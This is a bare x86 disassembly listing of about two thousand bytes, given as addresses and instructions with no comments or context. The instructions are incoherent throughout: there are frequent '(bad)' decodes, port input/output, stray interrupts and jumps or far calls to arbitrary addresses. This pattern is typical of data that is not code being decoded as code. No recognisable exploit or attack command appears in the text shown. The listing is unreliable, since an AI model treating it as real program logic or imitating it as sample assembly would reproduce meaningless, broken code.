  4127af:	mov    dl,0x83
  4127b1:	nop
  4127b2:	repz call 0xb19c:0x8b166ab
  4127ba:	repnz cs add al,0x9
  4127be:	ret    0xaab1
  4127c1:	pop    ebp
  4127c2:	ret    0xa4ab
  4127c5:	or     eax,0xf4bcbfb9
  4127ca:	in     al,dx
  4127cb:	stc    
  4127cc:	sub    BYTE PTR [eax+0x73],bl
  4127cf:	push   0x3ce078c5
  4127d4:	stos   BYTE PTR es:[edi],al
  4127d5:	stc    
  4127d6:	stc    
  4127d7:	mov    ds:0xfdabca8d,al
  4127dc:	jmp    DWORD PTR [esi+ecx*2]
  4127df:	xor    ebp,DWORD PTR [edx-0x59]
  4127e2:	and    bl,BYTE PTR [edx+0x7e]
  4127e5:	add    al,0x16
  4127e7:	fs mov ebx,0x13faf25a
  4127ed:	push   es
  4127ee:	shr    BYTE PTR [edi],1
  4127f0:	es pop ecx
  4127f2:	pop    edi
  4127f3:	xchg   DWORD PTR [edi+0x3],eax
  4127f6:	out    0xb,eax
  4127f8:	pop    edx
  4127f9:	dec    esi
  4127fa:	dec    ebx
  4127fb:	lea    edi,[eax-0x15ca415c]
  412801:	sub    DWORD PTR [ecx+ebx*8-0x21],edx
  412805:	push   0x96fa2418
  41280a:	leave  
  41280b:	cwde   
  41280c:	fiadd  WORD PTR [esi-0x80]
  41280f:	int    0xa3
  412811:	inc    esp
  412812:	test   DWORD PTR [esi],ecx
  412814:	jge    0x4127bb
  412816:	or     edi,esp
  412818:	sub    esi,0xe69ad0d5
  41281e:	iret   
  41281f:	(bad)
  412822:	loopne 0x41286d
  412824:	mov    ebp,0x369b5d01
  412829:	jo     0x412822
  41282b:	inc    edx
  41282c:	(bad)  
  41282e:	jne    0x412877
  412830:	sub    al,0xcd
  412832:	fcomp  DWORD PTR [ebx-0x2c]
  412836:	sub    al,0x1a
  412838:	xchg   DWORD PTR [ecx-0x49aa10d3],edx
  41283e:	xor    DWORD PTR [edx+0x7ef0ddc5],esi
  412844:	retf   
  412845:	aas    
  412846:	mov    esi,0xd140a638
  41284b:	sbb    edi,DWORD PTR gs:[edi]
  41284e:	in     eax,0xd8
  412850:	ds clc 
  412852:	lods   al,BYTE PTR ds:[esi]
  412853:	popf   
  412854:	push   esp
  412855:	out    dx,eax
  412856:	mov    ecx,DWORD PTR [esi+0x1b]
  412859:	enter  0xb56f,0x83
  41285d:	xchg   ebp,eax
  41285e:	jp     0x4128a6
  412860:	and    BYTE PTR [eax],0xbf
  412863:	rcr    BYTE PTR [edx],0xdb
  412866:	push   cs
  412867:	inc    esp
  412868:	cwde   
  412869:	inc    edx
  41286a:	test   al,0xa7
  41286c:	mov    al,0xd4
  41286e:	mov    ds,WORD PTR [edi+0x3b6627a6]
  412874:	mov    ah,dl
  412876:	jno    0x412809
  412878:	test   eax,0x71c4e2f7
  41287d:	test   eax,0xfe4699e3
  412882:	push   0x5c4c8159
  412887:	xchg   BYTE PTR [esi],dh
  412889:	jecxz  0x4128ac
  41288b:	jnp    0x4128c3
  41288d:	push   esi
  41288e:	cmp    BYTE PTR [esi-0xb],bl
  412891:	mov    esi,0x92e01775
  412896:	mov    esi,0xcb064454
  41289b:	push   0xffffffc5
  41289d:	dec    esi
  41289e:	mov    al,0x17
  4128a0:	sub    ecx,DWORD PTR ds:0xe648a529
  4128a6:	sub    al,0xe6
  4128a8:	dec    edi
  4128a9:	imul   edx,DWORD PTR [esi+0x54],0x25c7bb5b
  4128b0:	in     al,0x15
  4128b2:	xchg   ebx,eax
  4128b3:	and    esp,DWORD PTR [eax+0xe]
  4128b6:	iret   
  4128b7:	mov    eax,0x9b8901cb
  4128bc:	daa    
  4128bd:	(bad)  
  4128be:	mov    al,0xd7
  4128c0:	sub    al,0xbe
  4128c2:	pusha  
  4128c3:	(bad)  [ebx]
  4128c5:	inc    ebx
  4128c6:	and    al,BYTE PTR [edx+0x6]
  4128c9:	sti    
  4128ca:	pop    ecx
  4128cb:	xlat   BYTE PTR ds:[ebx]
  4128cc:	div    BYTE PTR [edi-0x68629d1d]
  4128d2:	push   ecx
  4128d3:	adc    al,0xd5
  4128d5:	jmp    0x85d4ac8e
  4128da:	enter  0xbc10,0x6a
  4128de:	loope  0x412948
  4128e0:	imul   esp,DWORD PTR [ecx+edx*1-0x5ec093b5],0xfffffff4
  4128e8:	push   es
  4128e9:	push   ss
  4128ea:	push   edi
  4128eb:	and    eax,0xc19eca07
  4128f0:	loope  0x41295f
  4128f2:	mov    cl,0x6d
  4128f4:	or     DWORD PTR [ebx+0x2fec974f],edx
  4128fa:	(bad)  
  4128fb:	call   0x30e2dcec
  412900:	xchg   esp,eax
  412901:	cmp    al,0xae
  412903:	cmp    ch,BYTE PTR [esi]
  412905:	or     eax,0x39dc1777
  41290a:	(bad)  
  41290b:	mov    esi,0x7eb00da
  412910:	dec    esi
  412911:	scas   eax,DWORD PTR es:[edi]
  412912:	mov    eax,0x9946db69
  412917:	xor    BYTE PTR [esi+0x7b],cl
  41291a:	cmp    cl,BYTE PTR ds:0x3a3f392b
  412920:	mov    gs,WORD PTR [ebx]
  412922:	into   
  412923:	dec    edx
  412924:	or     cl,BYTE PTR [ebx+0x6dc41aa6]
  41292a:	add    al,0x53
  41292c:	xchg   edi,eax
  41292d:	fistp  DWORD PTR [eax-0x7b]
  412930:	ret    
  412931:	sbb    BYTE PTR [eax-0x47],dh
  412934:	add    al,0x83
  412936:	push   ds
  412937:	sbb    BYTE PTR [eax+0x42],0x70
  41293b:	iret   
  41293c:	mov    cl,0xef
  41293e:	leave  
  41293f:	mov    esp,eax
  412941:	jge    0x4128c3
  412943:	das    
  412944:	cmp    eax,0xdd232ee1
  412949:	imul   ebx,DWORD PTR [edx],0xb902a9e7
  41294f:	jmp    0x44c9:0xd05f98eb
  412956:	icebp  
  412957:	jae    0x412964
  412959:	add    al,0xc9
  41295b:	push   cs
  41295c:	mov    bh,0x4
  41295e:	jae    0x41298d
  412960:	cmp    ecx,ebp
  412962:	mov    dl,0xed
  412964:	mov    edi,0x375cb8ac
  412969:	stos   DWORD PTR es:[edi],eax
  41296a:	adc    al,0x8e
  41296c:	xchg   eax,esp
  41296e:	test   al,0x6d
  412970:	imul   esi
  412972:	mov    ds:0x515364c3,al
  412977:	inc    edi
  412978:	bound  eax,QWORD PTR [edx+0x8]
  41297b:	rol    bl,cl
  41297d:	jnp    0x412907
  41297f:	push   0x1f25ac09
  412984:	into   
  412985:	dec    edi
  412986:	sbb    BYTE PTR [ebx+ecx*8-0x1616221f],bl
  41298d:	idiv   ebp
  41298f:	retf   
  412990:	fsubr  DWORD PTR [ebx+ebp*8+0x2b]
  412994:	xchg   edx,eax
  412995:	hlt    
  412996:	sahf   
  412997:	or     eax,0x6c583811
  41299c:	les    esi,FWORD PTR [edi+0xc7e9275]
  4129a2:	in     eax,0x80
  4129a4:	int    0xa5
  4129a6:	mov    ebx,0x9bd378bd
  4129ab:	cmp    al,0x4f
  4129ad:	lds    ebp,FWORD PTR fs:[ecx+0x57]
  4129b1:	and    eax,DWORD PTR [eax+0x3691c6b4]
  4129b7:	jne    0x41293c
  4129b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ba:	int    0x4c
  4129bc:	adc    al,0xb7
  4129be:	bound  edx,QWORD PTR [esi]
  4129c0:	fwait
  4129c1:	inc    eax
  4129c2:	push   ebx
  4129c3:	shl    DWORD PTR [edx],cl
  4129c5:	sub    edx,DWORD PTR [edi-0x6]
  4129c8:	out    dx,eax
  4129c9:	push   ebp
  4129ca:	pop    es
  4129cb:	dec    esi
  4129cc:	jae    0x4129ad
  4129ce:	data16 add al,al
  4129d1:	stos   BYTE PTR es:[edi],al
  4129d2:	cmp    dl,bh
  4129d4:	out    dx,al
  4129d5:	jle    0x412971
  4129d7:	inc    ebp
  4129d8:	int3   
  4129d9:	(bad)  
  4129da:	pop    ds
  4129db:	addr16 lock mov edi,?
  4129df:	xchg   ebx,eax
  4129e0:	pop    ebp
  4129e1:	mov    ebp,0x25b0f6e0
  4129e6:	mov    edx,0x5b0221b0
  4129eb:	mov    edx,0xf9279abe
  4129f0:	mov    BYTE PTR [ebp-0x57],dh
  4129f3:	inc    eax
  4129f4:	shr    DWORD PTR [ebx-0x14],0x6
  4129f8:	aas    
  4129f9:	push   esp
  4129fa:	outs   dx,BYTE PTR ds:[esi]
  4129fb:	sbb    al,BYTE PTR [edx-0x2f]
  4129fe:	lea    ecx,[edi+0x5b9d35b5]
  412a04:	cwde   
  412a05:	fnstsw WORD PTR [esi+0x7fbcd56f]
  412a0b:	bound  ebp,QWORD PTR [ecx+0x72]
  412a0e:	fisub  WORD PTR [esi+0x15]
  412a11:	ja     0x412a08
  412a13:	out    0x49,eax
  412a15:	bound  ebx,QWORD PTR [edx+eiz*4-0x46]
  412a19:	test   dh,dh
  412a1b:	ds mov cl,0xa3
  412a1e:	sub    eax,0x472fbde
  412a23:	mov    dl,0xb4
  412a25:	xor    al,BYTE PTR [esi]
  412a27:	stos   BYTE PTR es:[edi],al
  412a28:	sbb    ah,al
  412a2a:	shl    DWORD PTR [eax+0x575c052e],1
  412a30:	inc    BYTE PTR [esi+ebp*2]
  412a33:	pop    edx
  412a34:	call   DWORD PTR [esi]
  412a36:	fiadd  WORD PTR [ecx-0x7d]
  412a39:	or     esi,DWORD PTR [edx]
  412a3b:	mov    BYTE PTR ds:0xe935d674,ch
  412a41:	xor    ch,BYTE PTR [esi-0x44]
  412a44:	loopne 0x412a63
  412a46:	int3   
  412a47:	mov    ds:0x89e1ff89,eax
  412a4c:	add    ch,bl
  412a4e:	scas   eax,DWORD PTR es:[edi]
  412a4f:	shr    DWORD PTR [eax-0x33af8f2],0x1b
  412a56:	loopne 0x412a40
  412a58:	rcr    BYTE PTR [esi-0x29],0x1c
  412a5c:	mov    ds,WORD PTR [ecx]
  412a5e:	mov    al,ds:0x49c76dbd
  412a63:	(bad)  
  412a64:	sub    BYTE PTR [edi+ecx*2+0x61],al
  412a68:	and    ebx,edi
  412a6a:	je     0x412a10
  412a6c:	test   eax,0x68494033
  412a71:	jne    0x412a28
  412a73:	loope  0x412abf
  412a75:	xchg   ebp,eax
  412a76:	sbb    edi,eax
  412a78:	mov    eax,0x41708786
  412a7d:	mov    eax,0xa228cb45
  412a82:	add    esp,esi
  412a84:	sar    DWORD PTR [eax+0x76a19a27],cl
  412a8a:	pop    ds
  412a8b:	(bad)  
  412a8c:	fcomp  st(0)
  412a8e:	push   edi
  412a8f:	mov    DWORD PTR [esi+0x1f9f92d6],ebx
  412a95:	dec    eax
  412a96:	pop    ebp
  412a97:	cmp    DWORD PTR [ecx+eax*4+0x248b17c6],ebp
  412a9e:	mov    al,BYTE PTR [ebx+eax*4]
  412aa1:	sahf   
  412aa2:	test   eax,0x79bcc850
  412aa7:	cmp    edx,eax
  412aa9:	into   
  412aaa:	xchg   esp,eax
  412aab:	sti    
  412aac:	cmp    DWORD PTR [ecx],0x4cf638c7
  412ab2:	or     BYTE PTR [edi],dh
  412ab4:	int    0x8
  412ab6:	outs   dx,BYTE PTR gs:[esi]
  412ab8:	jns    0x412a9f
  412aba:	pop    es
  412abb:	and    esp,0x4d6ae05d
  412ac1:	xor    esp,esp
  412ac3:	daa    
  412ac4:	jae    0x412b32
  412ac6:	or     ebp,0x83a3bdda
  412acc:	push   ebx
  412acd:	inc    ebx
  412ace:	dec    ebx
  412acf:	dec    edi
  412ad0:	xor    eax,DWORD PTR [edi-0xb4bc704]
  412ad6:	adc    al,0xe1
  412ad8:	retf   0xf8e8
  412adb:	imul   ebp,edx,0x4b7f33cf
  412ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ae2:	push   es
  412ae3:	lahf   
  412ae4:	jge    0x412a73
  412ae6:	mov    al,0xcf
  412ae8:	jne    0x412a81
  412aea:	fisttp DWORD PTR [ebp-0x424b8b71]
  412af0:	jno    0x412ad0
  412af2:	push   esp
  412af3:	int3   
  412af4:	cmc    
  412af5:	adc    al,0xe9
  412af7:	aas    
  412af8:	sub    ebp,edi
  412afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412afb:	das    
  412afc:	dec    edi
  412afd:	imul   edx,DWORD PTR [ecx+ebp*2+0x6e],0x30
  412b02:	(bad)  
  412b03:	clc    
  412b04:	std    
  412b05:	int3   
  412b06:	out    0x28,al
  412b08:	jp     0x412b40
  412b0a:	in     eax,0x4b
  412b0c:	shl    BYTE PTR [edx+0x3d],1
  412b0f:	or     ch,BYTE PTR [ebx+0x39]
  412b12:	mov    dh,0x2c
  412b14:	inc    esp
  412b15:	ins    DWORD PTR es:[edi],dx
  412b16:	fsubr  st(4),st
  412b18:	stos   DWORD PTR es:[edi],eax
  412b19:	ins    DWORD PTR es:[edi],dx
  412b1a:	shl    BYTE PTR [ebp+0x32d75454],1
  412b20:	rcl    ebx,0x84
  412b23:	dec    edx
  412b24:	mov    ds:0x108ae09c,eax
  412b29:	mov    ecx,0xb9bbc10f
  412b2e:	scas   al,BYTE PTR es:[edi]
  412b2f:	cmp    DWORD PTR [edx],0x2701eaef
  412b35:	stc    
  412b36:	mov    ebp,0x70e92084
  412b3b:	aam    0xee
  412b3d:	int    0xb0
  412b3f:	dec    esi
  412b40:	push   edi
  412b41:	enter  0xe487,0x31
  412b45:	inc    ebx
  412b46:	mov    cl,0x1
  412b48:	dec    esp
  412b49:	mov    edi,0x8e395a8c
  412b4e:	es cli 
  412b50:	inc    ecx
  412b51:	and    al,0x46
  412b53:	in     eax,0x19
  412b55:	mov    bl,0x90
  412b57:	mov    dh,0xb4
  412b59:	inc    eax
  412b5a:	inc    ebx
  412b5b:	daa    
  412b5c:	aas    
  412b5d:	xchg   esp,eax
  412b5e:	hlt    
  412b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b60:	mov    bl,0xcc
  412b62:	js     0x412b35
  412b64:	aad    0x35
  412b66:	call   0x77140db5
  412b6b:	pop    es
  412b6c:	not    esp
  412b6e:	test   al,0x64
  412b70:	lahf   
  412b71:	stos   BYTE PTR es:[edi],al
  412b72:	adc    al,0x5f
  412b74:	lds    edx,FWORD PTR [edx-0x44e80356]
  412b7a:	ds cwde 
  412b7c:	inc    edi
  412b7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b7e:	in     al,0x4e
  412b80:	fwait
  412b81:	push   ecx
  412b82:	daa    
  412b83:	sbb    BYTE PTR [ebx+0x48],dl
  412b86:	stos   BYTE PTR es:[edi],al
  412b87:	and    ecx,DWORD PTR [edx-0x4bdcc76b]
  412b8d:	mov    al,0xf3
  412b8f:	pushf  
  412b90:	push   0xffffffde
  412b92:	xor    al,0xca
  412b94:	clc    
  412b95:	and    ch,BYTE PTR [eax+0x50]
  412b98:	xor    ah,bh
  412b9a:	cdq    
  412b9b:	and    BYTE PTR [eax-0x7b],bh
  412b9e:	push   0x1495738f
  412ba3:	xchg   ebx,eax
  412ba4:	pop    ebp
  412ba5:	xor    bl,dl
  412ba7:	stos   DWORD PTR es:[edi],eax
  412ba8:	std    
  412ba9:	test   eax,0x8aceb3f9
  412bae:	(bad)  
  412baf:	aaa    
  412bb0:	mov    es,ebp
  412bb2:	add    esp,DWORD PTR [edi+0x7f]
  412bb5:	imul   ebx,DWORD PTR [ebp+eax*8-0x68f9dd4e],0xffffffa3
  412bbd:	out    0x47,al
  412bbf:	rcl    DWORD PTR [esi],1
  412bc1:	cmp    eax,DWORD PTR [ebx*2-0x27665704]
  412bc8:	ret    0x245
  412bcb:	push   esp
  412bcc:	push   cs
  412bcd:	sub    BYTE PTR [ebp+edx*2-0x65b4f1be],ah
  412bd4:	inc    ebp
  412bd5:	dec    ebp
  412bd6:	lahf   
  412bd7:	hlt    
  412bd8:	idiv   ebp
  412bda:	jle    0x412bed
  412bdc:	add    edi,DWORD PTR [ebx+0x7b]
  412bdf:	into   
  412be0:	and    DWORD PTR [esi-0x76],ecx
  412be3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412be4:	into   
  412be5:	cdq    
  412be6:	(bad)  
  412be7:	in     eax,dx
  412be8:	and    eax,0x20127c8b
  412bed:	mov    cl,0x81
  412bef:	mov    eax,0x65a0136a
  412bf4:	and    ch,BYTE PTR fs:[esi]
  412bf7:	cdq    
  412bf8:	ins    DWORD PTR es:[edi],dx
  412bf9:	sbb    al,0xa2
  412bfb:	stos   DWORD PTR es:[edi],eax
  412bfc:	pop    ebx
  412bfd:	jl     0x412c32
  412bff:	xchg   ebp,eax
  412c00:	adc    BYTE PTR [edi+ebx*1+0x9],bh
  412c04:	or     BYTE PTR [ecx+0x7817bd45],0x24
  412c0b:	pop    ecx
  412c0c:	sbb    al,0xfd
  412c0e:	sbb    dh,BYTE PTR [esp+ecx*2+0x6b]
  412c12:	cli    
  412c13:	in     al,0x4e
  412c15:	mov    ?,WORD PTR [eax-0x22]
  412c18:	inc    esi
  412c1a:	and    ah,dl
  412c1c:	and    ecx,DWORD PTR [edi+0x3109b62e]
  412c22:	mov    DWORD PTR [ebp+0x2d4389cb],eax
  412c28:	(bad)  
  412c29:	inc    esi
  412c2a:	sbb    DWORD PTR [edx+eiz*2],0xffffffea
  412c2e:	cld    
  412c2f:	pop    ebp
  412c30:	inc    ebx
  412c31:	fcmovnu st,st(4)
  412c33:	jg     0x412c20
  412c35:	and    ebp,edi
  412c37:	(bad)  [ebx-0x60]
  412c3a:	push   cs
  412c3b:	xor    bh,BYTE PTR [ecx]
  412c3d:	push   es
  412c3e:	xchg   ebp,eax
  412c3f:	jbe    0x412c13
  412c41:	mov    ebx,0xb3fb3fd5
  412c46:	adc    ch,0x44
  412c49:	or     bl,al
  412c4b:	(bad)  
  412c4c:	std    
  412c4d:	icebp  
  412c4e:	jns    0x412c76
  412c50:	arpl   WORD PTR [esi-0x5f],di
  412c53:	xor    al,0xd7
  412c55:	inc    eax
  412c56:	adc    eax,0xe8d2cfc5
  412c5b:	cmp    al,cl
  412c5d:	pop    ds
  412c5e:	inc    ebx
  412c5f:	push   ss
  412c60:	in     al,dx
  412c61:	lea    edx,gs:[edx-0x8a08485]
  412c68:	pop    eax
  412c69:	test   al,0x99
  412c6b:	adc    ecx,0x4ab42ecf
  412c71:	xchg   esi,eax
  412c72:	mov    edx,0x39a9cedf
  412c77:	fucomp st(5)
  412c79:	xchg   ebp,eax
  412c7a:	mov    edx,0x77f36c9b
  412c7f:	mov    ds:0xa3c36b03,eax
  412c84:	jmp    0x412c57
  412c86:	je     0x412c15
  412c88:	push   esi
  412c89:	shl    BYTE PTR [edi],0x35
  412c8c:	fdivp  st(5),st
  412c8e:	cmp    al,0x81
  412c90:	ja     0x412ccd
  412c92:	mov    ebp,0x20490c6f
  412c97:	jge    0x412c79
  412c99:	out    0xef,eax
  412c9b:	(bad)  
  412c9c:	imul   esp,DWORD PTR [eax+0x18],0xcd07db7a
  412ca3:	test   al,0xa8
  412ca5:	aas    
  412ca6:	xlat   BYTE PTR ds:[ebx]
  412ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ca8:	outs   dx,BYTE PTR ds:[esi]
  412ca9:	or     al,0xf0
  412cab:	sub    BYTE PTR ds:0x3ed8bff1,dl
  412cb1:	push   ebx
  412cb2:	out    0x20,al
  412cb4:	jne    0x412d18
  412cb6:	leave  
  412cb7:	test   ah,dl
  412cb9:	sbb    al,0x31
  412cbb:	push   0x26
  412cbd:	into   
  412cbe:	mov    ch,0xc6
  412cc0:	popa   
  412cc1:	pop    ecx
  412cc2:	jl     0x412ce5
  412cc4:	call   0x40b8:0x75e1374c
  412ccb:	arpl   WORD PTR [edx+0x33],ax
  412cce:	jmp    0x412cfe
  412cd0:	push   0xffffffa5
  412cd2:	shl    DWORD PTR [edi],cl
  412cd4:	jns    0x412d54
  412cd6:	and    al,0xf
  412cd8:	(bad)  [ebp+eiz*4-0x43]
  412cdc:	ins    BYTE PTR es:[edi],dx
  412cdd:	fistp  DWORD PTR [ecx-0x6e]
  412ce0:	push   cs
  412ce1:	popa   
  412ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ce3:	xchg   edx,eax
  412ce4:	fnstenv [eax-0x47]
  412ce7:	aad    0xa
  412ce9:	fidivr DWORD PTR [eax-0x5e]
  412cec:	xchg   DWORD PTR [edi],ebp
  412cee:	icebp  
  412cef:	arpl   si,sp
  412cf1:	fldcw  WORD PTR [esi+esi*4-0x34849563]
  412cf8:	test   al,0xfe
  412cfa:	loopne 0x412cc4
  412cfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cfd:	sbb    DWORD PTR [ebx+0x381e7845],0x4563f37d
  412d07:	jle    0x412c93
  412d09:	xor    DWORD PTR [ecx+edi*1],ebp
  412d0c:	sub    eax,0xa5322a7a
  412d11:	sub    bl,cl
  412d13:	xor    al,BYTE PTR [eax]
  412d15:	cmp    al,0x3e
  412d17:	shl    DWORD PTR [edx],1
  412d19:	in     al,dx
  412d1a:	test   eax,0x83b43a73
  412d1f:	aad    0xe4
  412d21:	dec    esp
  412d22:	rol    DWORD PTR [edx],0xcc
  412d25:	or     al,0xfd
  412d27:	aad    0x79
  412d29:	js     0x412d14
  412d2b:	call   0xd938:0x3fb58b9a
  412d32:	test   edx,eax
  412d34:	jmp    0x5ea2:0x6c61467c
  412d3b:	add    esp,esp
  412d3d:	sbb    BYTE PTR [esi],ch
  412d3f:	shl    DWORD PTR [ecx+esi*4],1
  412d42:	cmp    BYTE PTR [edx-0x5c],0x97
  412d46:	mul    BYTE PTR [ecx-0x96d8c39]
  412d4c:	xchg   ebx,eax
  412d4d:	std    
  412d4e:	jecxz  0x412d0e
  412d50:	js     0x412d97
  412d52:	xor    DWORD PTR [ebx],esi
  412d54:	gs ja  0x412d4c
  412d57:	mov    es,WORD PTR [ebx+0x74]
  412d5a:	push   0x1b
  412d5c:	adc    BYTE PTR [esi+0x29],ch
  412d5f:	sub    eax,0xa4cacc9b
  412d64:	mov    ecx,0x19f1f917
  412d69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d6a:	mov    edi,0x1463eb1
  412d6f:	call   0x362a:0xd92884ff
  412d76:	xlat   BYTE PTR ds:[ebx]
  412d77:	cwde   
  412d78:	lods   al,BYTE PTR ds:[esi]
  412d79:	dec    ebp
  412d7a:	retf   
  412d7b:	mov    esp,0x9867a8a5
  412d80:	bound  edi,QWORD PTR [ebp+0x37]
  412d83:	(bad)  
  412d85:	popa   
  412d86:	pextrw edi,(bad),0xc5
  412d88:	mov    esi,0xee16cac8
  412d8d:	pop    esi
  412d8e:	mov    ah,0x38
  412d90:	push   esi
  412d91:	(bad)  
  412d92:	(bad)  
  412d93:	fmul   DWORD PTR [ebp-0x532c0a23]
  412d99:	xor    BYTE PTR [edx-0x17],al
  412d9c:	mov    ds:0xa698cd03,al
  412da1:	or     DWORD PTR [ebx+edx*8],esp
  412da4:	and    BYTE PTR [esi-0x4e],0x18
  412da8:	pop    esp
  412da9:	shl    DWORD PTR [esi+0x2af3393e],cl
  412daf:	popa   
  412db0:	in     eax,dx
  412db1:	gs mov edi,0x208e10e8
  412db7:	loope  0x412d4e
  412db9:	xor    ebp,0xab734c3a
  412dbf:	out    dx,al
  412dc0:	dec    ebp
  412dc1:	dec    ebp
  412dc2:	mov    eax,ds:0xb3d94188
  412dc7:	std    
  412dc8:	in     al,dx
  412dc9:	sbb    DWORD PTR [ebx-0x56f0b5ad],ecx
  412dcf:	mov    cl,0xf8
  412dd1:	xor    eax,0xb92de744
  412dd6:	pusha  
  412dd7:	add    al,0x64
  412dd9:	add    eax,0x2932474b
  412dde:	outs   dx,DWORD PTR ds:[esi]
  412ddf:	ret    0x1ebf
  412de2:	mov    dh,0xf1
  412de4:	add    eax,DWORD PTR [ebp+0x38]
  412de7:	stc    
  412de8:	test   eax,0xf99dffd1
  412ded:	out    0x2d,eax
  412def:	sbb    ecx,edx
  412df1:	(bad)  
  412df2:	mov    eax,ds:0x102825f6
  412df7:	mov    ch,ch
  412df9:	loopne 0x412e67
  412dfb:	fs aas 
  412dfd:	jb     0x412e22
  412dff:	adc    eax,0x6f82889b
  412e04:	fist   DWORD PTR [ecx-0x7d]
  412e07:	pop    esp
  412e08:	cmp    ebx,esp
  412e0a:	xor    ecx,ebx
  412e0c:	or     cl,BYTE PTR [edx-0x70]
  412e0f:	pop    esi
  412e10:	mov    bh,0xe5
  412e12:	cmc    
  412e13:	add    BYTE PTR [edx],bl
  412e15:	and    DWORD PTR [edx+ebp*8],ebp
  412e18:	jmp    0x83a7:0x40af364b
  412e1f:	pusha  
  412e20:	xor    DWORD PTR [edi+edi*4+0x2fb5bf0f],eax
  412e27:	cmp    al,BYTE PTR ds:0x439c5acd
  412e2d:	sbb    DWORD PTR [ebp-0x2d453f82],esp
  412e33:	imul   eax,ecx,0xffffffe3
  412e36:	mov    ebp,0x749f81d
  412e3b:	sub    al,0x2
  412e3d:	jnp    0x412e95
  412e3f:	push   edi
  412e40:	pop    ss
  412e41:	iret   
  412e42:	xchg   DWORD PTR [edx-0x3b],ebp
  412e45:	std    
  412e46:	ins    DWORD PTR es:[edi],dx
  412e47:	pop    esi
  412e48:	and    DWORD PTR [ebp-0x64],esi
  412e4b:	xchg   esp,eax
  412e4c:	pop    es
  412e4d:	repz mov ds:0x74b8e7bb,eax
  412e53:	(bad)  
  412e54:	mov    edi,0xf852651b
  412e59:	nop
  412e5a:	(bad)  
  412e5b:	xchg   BYTE PTR [edi],dh
  412e5d:	fmul   DWORD PTR [eax]
  412e5f:	or     al,0x9e
  412e61:	or     bl,BYTE PTR [ebp+0x12eac77a]
  412e67:	xlat   BYTE PTR ds:[ebx]
  412e68:	and    DWORD PTR [edi],edx
  412e6a:	(bad)  
  412e6b:	push   eax
  412e6c:	call   0xbd28ba16
  412e71:	loope  0x412e6c
  412e73:	fs test al,0xef
  412e76:	(bad)  
  412e77:	call   0x39613c97
  412e7c:	push   esp
  412e7d:	cmp    cl,dl
  412e7f:	mov    cl,0xf6
  412e81:	jecxz  0x412e46
  412e83:	retf   0x96b
  412e86:	push   cs
  412e87:	sub    bl,bh
  412e89:	imul   ecx,DWORD PTR [ebp-0x177b7e2c],0x46883923
  412e93:	or     al,0x65
  412e95:	dec    esp
  412e96:	jbe    0x412ef4
  412e98:	scas   al,BYTE PTR es:[edi]
  412e99:	test   DWORD PTR [edi+eiz*2+0x56557d54],ebp
  412ea0:	and    DWORD PTR ss:[eax],esi
  412ea3:	sti    
  412ea4:	jo     0x412ef1
  412ea6:	adc    dl,BYTE PTR [edi-0x6d]
  412ea9:	jmp    DWORD PTR [ebp+0xec87f14]
  412eaf:	test   BYTE PTR [esi+0x4d],ah
  412eb2:	adc    BYTE PTR [edx+0x41],dl
  412eb5:	fild   WORD PTR [ebx]
  412eb7:	sti    
  412eb8:	mov    dl,0xc
  412eba:	sub    dh,cl
  412ebc:	repz fwait
  412ebe:	repz inc esi
  412ec0:	xchg   BYTE PTR [edi+0x7148ddfc],dl
  412ec6:	sub    al,0x5e
  412ec8:	push   esp
  412ec9:	nop
  412eca:	cmp    esp,DWORD PTR [eax+0x48cbe835]
  412ed0:	jmp    0xcb68:0x8fded1a4
  412ed7:	add    dl,bh
  412ed9:	inc    DWORD PTR ds:[ecx]
  412edc:	cwde   
  412edd:	xchg   ebx,eax
  412ede:	mov    dl,0x87
  412ee0:	dec    edi
  412ee1:	outs   dx,BYTE PTR ds:[esi]
  412ee2:	mov    esp,0x1604b23b
  412ee7:	mov    edi,0xae130814
  412eec:	mov    bl,0xe2
  412eee:	call   DWORD PTR [eax]
  412ef0:	sub    bl,BYTE PTR [edx+0x14]
  412ef3:	dec    ecx
  412ef4:	adc    cl,BYTE PTR [edi]
  412ef6:	test   eax,0xcc305d01
  412efb:	add    BYTE PTR [ecx+0x5d],dh
  412efe:	cmp    DWORD PTR [esi],edi
  412f00:	dec    edi
  412f01:	imul   edi,esp,0xfffffff4
  412f04:	dec    esi
  412f05:	(bad)  
  412f06:	mul    bh
  412f08:	ins    BYTE PTR es:[edi],dx
  412f09:	jg     0x412f2b
  412f0b:	les    eax,FWORD PTR [ecx-0xbc895ba]
  412f11:	shr    DWORD PTR [esi+ebx*4],0x5e
  412f15:	sub    DWORD PTR [esp+edx*4-0x6aabdc93],0xe
  412f1d:	or     al,0x9f
  412f1f:	fs push eax
  412f21:	lea    edx,[ebx]
  412f23:	test   al,0x49
  412f25:	xor    eax,0x5c7c22ed
  412f2a:	inc    eax
  412f2b:	add    eax,DWORD PTR [edx]
  412f2d:	and    eax,0x3469e6f5
  412f32:	adc    BYTE PTR [ebx-0x6d],ah
  412f35:	inc    esp
  412f36:	pop    eax
  412f37:	xor    BYTE PTR [ebx-0x59a537a7],dl
  412f3d:	idiv   BYTE PTR [ecx]
  412f3f:	push   cs
  412f40:	popf   
  412f41:	pushf  
  412f42:	jnp    0x412f23
  412f44:	xlat   BYTE PTR ds:[ebx]
  412f45:	outs   dx,BYTE PTR ds:[esi]
  412f46:	cmp    ebx,esi
  412f48:	lea    eax,[ecx]
  412f4a:	xchg   BYTE PTR [ecx],bl
  412f4c:	sbb    DWORD PTR [edi+edi*2],ebx
  412f4f:	pop    edi
  412f50:	pop    ecx
  412f51:	sbb    DWORD PTR [edi+0x52],edx
  412f54:	retf   
  412f55:	stc    
  412f56:	mov    edi,0x8d49e211
  412f5b:	lea    esi,[edi]
  412f5d:	add    bl,BYTE PTR [edi+0x67516bb3]
  412f63:	ss rcr edx,0xa0
  412f67:	push   ebx
  412f68:	mov    ah,0x4f
  412f6a:	push   es
  412f6b:	icebp  
  412f6c:	cmp    DWORD PTR [eax],ecx
  412f6e:	push   es
